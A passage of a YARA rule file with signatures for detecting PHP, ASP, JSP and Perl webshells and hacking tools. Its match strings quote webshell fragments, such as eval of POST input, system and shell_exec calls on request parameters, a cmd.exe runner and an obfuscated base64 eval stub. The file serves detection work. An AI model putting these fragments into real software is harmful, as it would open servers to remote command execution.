$_POST['regval'] : 'c:\\\\winnt\\\\backdoor.exe'\" \n   condition: \n      1 of them\n}\n\nrule WebShell_ZyklonShell_RID2F05 : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"PHP Webshells Github Archive - file ZyklonShell.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-06 11:39:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"The requested URL /Nemo/shell/zyklonshell.txt was not found on this server.<P>\" fullword\n      $s1 = \"<!DOCTYPE HTML PUBLIC \\\"-//IETF//DTD HTML 2.0//EN\\\">\" fullword\n      $s2 = \"<TITLE>404 Not Found</TITLE>\" fullword\n      $s3 = \"<H1>Not Found</H1>\" fullword\n   condition: \n      all of them\n}\n\nrule WebShell_php_webshells_myshell_RID3353 : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"PHP Webshells Github Archive - file myshell.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-06 14:43:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"if($ok==false &&$status && $autoErrorTrap)system($command . \\\" 1> /tmp/outpu\" \n      $s5 = \"system($command . \\\" 1> /tmp/output.txt 2>&1; cat /tmp/output.txt; rm /tmp/o\" \n      $s15 = \"<title>$MyShellVersion - Access Denied</title>\" fullword\n      $s16 = \"}$ra44  = rand(1,99999);$sj98 = \\\"sh-$ra44\\\";$ml = \\\"$sd98\\\";$a5 = $_SERVER['HTT\" \n   condition: \n      1 of them\n}\n\nrule WebShell_php_webshells_lolipop_RID3354 : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"PHP Webshells Github Archive - file lolipop.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-06 14:43:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s3 = \"$commander = $_POST['commander']; \" fullword\n      $s9 = \"$sourcego = $_POST['sourcego']; \" fullword\n      $s20 = \"$result = mysql_query($loli12) or die (mysql_error()); \" fullword\n   condition: \n      all of them\n}\n\nrule WebShell_simple_cmd_RID2EA3 : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"PHP Webshells Github Archive - file simple_cmd.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-06 11:23:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"<input type=TEXT name=\\\"-cmd\\\" size=64 value=\\\"<?=$cmd?>\\\" \" fullword\n      $s2 = \"<title>G-Security Webshell</title>\" fullword\n      $s4 = \"<? if($cmd != \\\"\\\") print Shell_Exec($cmd);?>\" fullword\n      $s6 = \"<? $cmd = $_REQUEST[\\\"-cmd\\\"];?>\" fullword\n   condition: \n      1 of them\n}\n\nrule WebShell_aZRaiLPhp_v1_0_2_RID2FF7 : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"PHP Webshells Github Archive - file aZRaiLPhp v1.0.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-06 12:19:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2023-11-23\"\n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"<font size='+1'color='#0000FF'>aZRaiLPhP'nin URL'si: http://$HTTP_HOST$RED\" \n      $s4 = \"$fileperm=base_convert($_POST['fileperm'],8,10);\" fullword\n      $s19 = \"touch (\\\"$path/$dismi\\\") or die(\\\"Dosya Olu\" fullword\n      $s20 = \"echo \\\"<div align=left><a href='./$this_file?dir=$path/$file'>G\" fullword\n   condition: \n      2 of them\n}\n\nrule WebShell__Cyber_Shell_cybershell_Cyber_Shell__v_1_0__RID3B1A : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"PHP Webshells Github Archive - from files Cyber Shell.php, cybershell.php, Cyber Shell (v 1.0).php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-06 20:14:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"cabf47b96e3b2c46248f075bdbc46197db28a25f\"\n      hash2 = \"9e165d4ed95e0501cd9a90155ac60546eb5b1076\"\n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s4 = \" <a href=\\\"http://www.cyberlords.net\\\" target=\\\"_blank\\\">Cyber Lords Community</\" \n      $s10 = \"echo \\\"<meta http-equiv=Refresh content=\\\\\\\"0; url=$PHP_SELF?edit=$nameoffile&sh\" \n      $s11 = \" *   Coded by Pixcher\" fullword\n      $s16 = \"<input type=text size=55 name=newfile value=\\\"$d/newfile.php\\\">\" fullword\n   condition: \n      2 of them\n}\n\nrule WebShell_Generic_PHP_7_RID2F20 : DEMO GEN T1505_003 WEBSHELL {\n   meta:\n      description = \"PHP Webshells Github Archive\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-06 11:43:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"128988c8ef5294d51c908690d27f69dffad4e42e\"\n      hash2 = \"fd64f2bf77df8bcf4d161ec125fa5c3695fe1267\"\n      hash3 = \"715f17e286416724e90113feab914c707a26d456\"\n      tags = \"DEMO, GEN, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"header(\\\"Content-disposition: filename=$filename.sql\\\");\" fullword\n      $s1 = \"else if( $action == \\\"dumpTable\\\" || $action == \\\"dumpDB\\\" ) {\" fullword\n      $s2 = \"echo \\\"<font color=blue>[$USERNAME]</font> - \\\\n\\\";\" fullword\n      $s4 = \"if( $action == \\\"dumpTable\\\" )\" fullword\n   condition: \n      2 of them\n}\n\nrule WebShell__Small_Web_Shell_by_ZaCo_small_zaco_zacosmall_RID3C61 : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"PHP Webshells Github Archive - from files Small Web Shell by ZaCo.php, small.php, zaco.php, zacosmall.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-06 21:09:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"e4ba288f6d46dc77b403adf7d411a280601c635b\"\n      hash2 = \"e5713d6d231c844011e9a74175a77e8eb835c856\"\n      hash3 = \"1b836517164c18caf2c92ee2a06c645e26936a0c\"\n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"if(!$result2)$dump_file.='#error table '.$rows[0];\" fullword\n      $s4 = \"if(!(@mysql_select_db($db_dump,$mysql_link)))echo('DB error');\" fullword\n      $s6 = \"header('Content-Length: '.strlen($dump_file).\\\"\\\\n\\\");\" fullword\n      $s20 = \"echo('Dump for '.$db_dump.' now in '.$to_file);\" fullword\n   condition: \n      2 of them\n}\n\nrule WebShell_Generic_PHP_9_RID2F22 : DEMO GEN SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"PHP Webshells Github Archive - from files KAdot Universal Shell v0.1.6.php, KAdot_Universal_Shell_v0.1.6.php, KA_uShell 0.1.6.php\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2014-04-06 11:44:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2022-12-06\"\n      hash1 = \"2266178ad4eb72c2386c0a4d536e5d82bb7ed6a2\"\n      hash2 = \"0daed818cac548324ad0c5905476deef9523ad73\"\n      tags = \"DEMO, GEN, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 3a 3c 62 3e 22 20 2e 62 61 73 65 36 34 5f 64 65 63 6f 64 65 28 24 5f 50 4f 53 54 5b 27 74 6f 74 27 5d 29 2e 20 22 3c 2f 62 3e 22 3b } \n      $ = { 69 66 20 28 69 73 73 65 74 28 24 5f 50 4f 53 54 5b 27 77 71 27 5d 29 20 26 26 20 24 5f 50 4f 53 54 5b 27 77 71 27 5d 3c 3e 22 22 29 20 7b } \n      $ = { 70 61 73 73 74 68 72 75 28 24 5f 50 4f 53 54 5b 27 63 27 5d 29 3b } \n      $ = { 3c 69 6e 70 75 74 20 74 79 70 65 3d 22 72 61 64 69 6f 22 20 6e 61 6d 65 3d 22 74 61 63 22 20 76 61 6c 75 65 3d 22 31 22 3e 42 36 34 20 44 65 63 6f 64 65 3c 62 72 3e } \n   condition: \n      1 of them\n}\n\nrule WebShell_Generic_PHP_1_RID2F1A : DEMO GEN SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"PHP Webshells Github Archive - from files Dive Shell 1.0\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-06 11:42:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2022-12-06\"\n      hash1 = \"2558e728184b8efcdb57cfab918d95b06d45de04\"\n      hash2 = \"203a8021192531d454efbc98a3bbb8cabe09c85c\"\n      hash3 = \"b79709eb7801a28d02919c41cc75ac695884db27\"\n      tags = \"DEMO, GEN, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 76 61 72 20 63 6f 6d 6d 61 6e 64 5f 68 69 73 74 20 3d 20 6e 65 77 20 41 72 72 61 79 28 3c 3f 70 68 70 20 65 63 68 6f 20 24 6a 73 5f 63 6f 6d 6d 61 6e 64 5f 68 69 73 74 20 3f 3e 29 3b } \n      $ = { 69 66 20 28 65 6d 70 74 79 28 24 5f 53 45 53 53 49 4f 4e 5b 27 63 77 64 27 5d 29 20 7c 7c 20 21 65 6d 70 74 79 28 24 5f 52 45 51 55 45 53 54 5b 27 72 65 73 65 74 27 5d 29 29 20 7b } \n      $ = { 69 66 20 28 65 2e 6b 65 79 43 6f 64 65 20 3d 3d 20 33 38 20 26 26 20 63 75 72 72 65 6e 74 5f 6c 69 6e 65 20 3c 20 63 6f 6d 6d 61 6e 64 5f 68 69 73 74 2e 6c 65 6e 67 74 68 2d 31 29 20 7b } \n   condition: \n      1 of them\n}\n\nrule WebShell__findsock_php_findsock_shell_php_reverse_shell_RID3D7D : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"PHP Webshells Github Archive - from files findsock.c, php-findsock-shell.php, php-reverse-shell.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-06 21:56:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"4a20f36035bbae8e342aab0418134e750b881d05\"\n      hash2 = \"40dbdc0bdf5218af50741ba011c5286a723fa9bf\"\n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"// me at pentestmonkey@pentestmonkey.net\" fullword\n   condition: \n      all of them\n}\n\nrule WebShell_Generic_PHP_6_RID2F1F : DEMO GEN SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"PHP Webshells Github Archive - from files c0derz shell [csh] v. 0.1.1 release.php, CrystalShell v.1.php, load_shell.php, Loaderz WEB Shell.php, stres.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-06 11:43:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"335a0851304acedc3f117782b61479bbc0fd655a\"\n      hash2 = \"ca9fcfb50645dc0712abdf18d613ed2196e66241\"\n      hash3 = \"36d8782d749638fdcaeed540d183dd3c8edc6791\"\n      tags = \"DEMO, GEN, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"@eval(stripslashes($_POST['phpcode']));\" fullword\n      $s5 = \"echo shell_exec($com);\" fullword\n      $s7 = \"if($sertype == \\\"winda\\\"){\" fullword\n      $s8 = \"function execute($com)\" fullword\n      $s12 = \"echo decode(execute($cmd));\" fullword\n      $s15 = \"echo system($com);\" fullword\n   condition: \n      4 of them\n}\n\nrule HKTL_Unpack_Injectt_RID2E35 : DEMO HKTL T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file Injectt.exe\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-06 11:04:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, HKTL, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"%s -Run                              -->To Install And Run The Service\" \n      $s3 = \"%s -Uninstall                        -->To Uninstall The Service\" \n      $s4 = \"(STANDARD_RIGHTS_REQUIRED |SC_MANAGER_CONNECT |SC_MANAGER_CREATE_SERVICE |SC_MAN\" \n   condition: \n      all of them\n}\n\nrule Webshell_ASP_CmdAsp_2_RID2EB2 : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file CmdAsp.asp\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-06 11:25:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"' -- Read the output from our command and remove the temp file -- '\" \n      $s6 = \"Call oScript.Run (\\\"cmd.exe /c \\\" & szCMD & \\\" > \\\" & szTempFile, 0, True)\" \n      $s9 = \"' -- create the COM objects that we will be using -- '\" \n   condition: \n      all of them\n}\n\nrule MAL_vanquish_RID2BB9 : DEMO MAL T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file vanquish.dll\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-06 09:18:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, MAL, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s3 = \"You cannot delete protected files/folders! Instead, your attempt has been logged\" \n      $s8 = \"?VCreateProcessA@@YGHPBDPADPAU_SECURITY_ATTRIBUTES@@2HKPAX0PAU_STARTUPINFOA@@PAU\" \n      $s9 = \"?VFindFirstFileExW@@YGPAXPBGW4_FINDEX_INFO_LEVELS@@PAXW4_FINDEX_SEARCH_OPS@@2K@Z\" \n   condition: \n      all of them\n}\n\nrule HKTL_shelltools_g0t_root_uptime_RID336C : DEMO HKTL T1505_003 WEBSHELL {\n   meta:\n      description = \"Webshells Auto-generated - file uptime.exe\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-06 14:47:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, HKTL, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"JDiamondCSlC~\" \n      $s1 = \"CharactQA\" \n      $s2 = \"$Info: This file is packed with the UPX executable packer $\" \n      $s5 = \"HandlereateConso\" \n      $s7 = \"ION\\\\System\\\\FloatingPo\" \n   condition: \n      all of them\n}\n\nrule PHP_Cloaked_Webshell_SuperFetchExec_RID347D : ANOMALY DEMO T1036 T1505_003 WEBSHELL {\n   meta:\n      description = \"Looks like a webshell cloaked as GIF - https://pastebin.com/1XE208s6\"\n      author = \"Florian Roth\"\n      reference = \"https://pastebin.com/1XE208s6\"\n      date = \"2014-04-05 15:32:41\"\n      score = 50\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      tags = \"ANOMALY, DEMO, T1036, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"else{$d.=@chr(($h[$e[$o]]<<4)+($h[$e[++$o]]));}}eval($d);\" \n   condition: \n      $s0\n}\n\nrule WebShell_RemExp_asp_php_RID3021 : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"PHP Webshells Github Archive - file RemExp.asp.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-05 12:26:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"lsExt = Right(FileName, Len(FileName) - liCount)\" fullword\n      $s7 = \"<td bgcolor=\\\"<%=BgColor%>\\\" title=\\\"<%=File.Name%>\\\"> <a href= \\\"showcode.asp?f\" \n      $s13 = \"Response.Write Drive.ShareName & \\\" [share]\\\"\" fullword\n      $s19 = \"If Request.QueryString(\\\"CopyFile\\\") <> \\\"\\\" Then\" fullword\n      $s20 = \"<td width=\\\"40%\\\" height=\\\"20\\\" bgcolor=\\\"silver\\\">  Name</td>\" fullword\n   condition: \n      all of them\n}\n\nrule WebShell_dC3_Security_Crew_Shell_PRiV_RID351E : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"PHP Webshells Github Archive - file dC3_Security_Crew_Shell_PRiV.php\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-05 15:59:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"@rmdir($_GET['file']) or die (\\\"[-]Error deleting dir!\\\");\" fullword\n      $s4 = \"$ps=str_replace(\\\"\\\\\\\\\\\",\\\"/\\\",getenv('DOCUMENT_ROOT'));\" fullword\n      $s5 = \"header(\\\"Expires: \\\".date(\\\"r\\\",mktime(0,0,0,1,1,2030)));\" fullword\n      $s15 = \"search_file($_POST['search'],urldecode($_POST['dir']));\" fullword\n      $s16 = \"echo base64_decode($images[$_GET['pic']]);\" fullword\n      $s20 = \"if (isset($_GET['rename_all'])) {\" fullword\n   condition: \n      3 of them\n}\n\nrule DarkSecurityTeam_Webshell_RID3107 : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Dark Security Team Webshell\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-04-02 13:05:01\"\n      score = 50\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"form method=post><input type=hidden name=\\\"\\\"#\\\"\\\" value=Execute(Session(\\\"\\\"#\\\"\\\"))><input name=thePath value=\\\"\\\"\\\"&HtmlEncode(Server.MapPath(\\\".\\\"))&\" ascii\n   condition: \n      1 of them\n}\n\nrule Webshell_perlbot_pl_RID2ED9 : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file perlbot.pl.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 11:32:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"my @adms=(\\\"Kelserific\\\",\\\"Puna\\\",\\\"nod32\\\")\" \n      $s1 = \"#Acesso a Shel - 1 ON 0 OFF\" \n   condition: \n      1 of them\n}\n\nrule Webshell_php_backdoor_php_RID3139 : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file php-backdoor.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 13:13:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"http://michaeldaw.org   2006\" \n      $s1 = \"or http://<? echo $SERVER_NAME.$REQUEST_URI; ?>?d=c:/windows on win\" \n      $s3 = \"coded by z0mbie\" \n   condition: \n      1 of them\n}\n\nrule Webshell_shellbot_pl_RID2F3E : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file shellbot.pl.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 11:48:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"ShellBOT\" \n      $s1 = \"PacktsGr0up\" \n      $s2 = \"CoRpOrAtIoN\" \n      $s3 = \"# Servidor de irc que vai ser usado \" \n      $s4 = \"/^ctcpflood\\\\s+(\\\\d+)\\\\s+(\\\\S+)\" \n   condition: \n      2 of them\n}\n\nrule Webshell_jsp_reverse_jsp_2_RID318B : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file jsp-reverse.jsp.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 13:27:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"// backdoor.jsp\" \n      $s1 = \"JSP Backdoor Reverse Shell\" \n      $s2 = \"http://michaeldaw.org\" \n   condition: \n      2 of them\n}\n\nrule Webshell_Tool_asp_RID2DE7 : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file Tool.asp.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 10:51:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"mailto:rhfactor@antisocial.com\" \n      $s2 = \"?raiz=root\" \n      $s3 = \"DIGO CORROMPIDO<BR>CORRUPT CODE\" \n      $s4 = \"key = \\\"5DCADAC1902E59F7273E1902E5AD8414B1902E5ABF3E661902E5B554FC41902E53205CA0\" \n   condition: \n      2 of them\n}\n\nrule Webshell_NT_Addy_asp_RID2ECC : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file NT Addy.asp.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 11:29:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"NTDaddy v1.9 by obzerve of fux0r inc\" \n      $s2 = \"<ERROR: THIS IS NOT A TEXT FILE>\" \n      $s4 = \"RAW D.O.S. COMMAND INTERFACE\" \n   condition: \n      1 of them\n}\n\nrule Webshell_phvayvv_php_php_RID3108 : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file phvayvv.php.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 13:05:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"{mkdir(\\\"$dizin/$duzenx2\\\",777)\" \n      $s1 = \"$baglan=fopen($duzkaydet,'w');\" \n      $s2 = \"PHVayv 1.0\" \n   condition: \n      1 of them\n}\n\nrule Webshell_rst_sql_php_php_RID30FC : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file rst_sql.php.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 13:03:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"C:\\\\tmp\\\\dump_\" \n      $s1 = \"RST MySQL\" \n      $s2 = \"http://rst.void.ru\" \n      $s3 = \"$st_form_bg='R0lGODlhCQAJAIAAAOfo6u7w8yH5BAAAAAAALAAAAAAJAAkAAAIPjAOnuJfNHJh0qtfw0lcVADs=';\" \n   condition: \n      2 of them\n}\n\nrule Webshell_c99madshell_v2_0_php_php_RID33A9 : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file c99madshell_v2.0.php.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 14:57:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"eval(gzinflate(base64_decode('HJ3HkqNQEkU/ZzqCBd4t8V4YAQI2E3jvPV8/1Gw6orsVFLyXef\" \n   condition: \n      all of them\n}\n\nrule Webshell_telnet_pl_RID2E6D : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file telnet.pl.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 11:14:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"W A R N I N G: Private Server\" \n      $s2 = \"$Message = q$<pre><font color=\\\"#669999\\\"> _____  _____  _____          _____   \" \n   condition: \n      all of them\n}\n\nrule Webshell_w3d_php_php_RID2F02 : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file w3d.php.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 11:38:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"W3D Shell\" \n      $s1 = \"By: Warpboy\" \n      $s2 = \"No Query Executed\" \n   condition: \n      2 of them\n}\n\nrule Webshell_WebShell_cgi_RID2F4E : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file WebShell.cgi.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 11:51:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"WebShell.cgi\" \n      $s2 = \"<td><code class=\\\"entry-[% if entry.all_rights %]mine[% else\" \n   condition: \n      all of them\n}\n\nrule Webshell_WinX_Shell_html_RID3097 : DEMO SCRIPT T1505_003 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file WinX Shell.html.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 12:46:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, T1505_003, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"WinX Shell\" \n      $s1 = \"Created by greenwood from n57\" \n      $s2 = \"<td><font color=\\\\\\\"#990000\\\\\\\">Win Dir:</font></td>\" \n   condition: \n      2 of them\n}\n\nrule Webshell_csh_php_php_RID2F32 : DEMO T1505_003 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file csh.php.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 11:46:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC 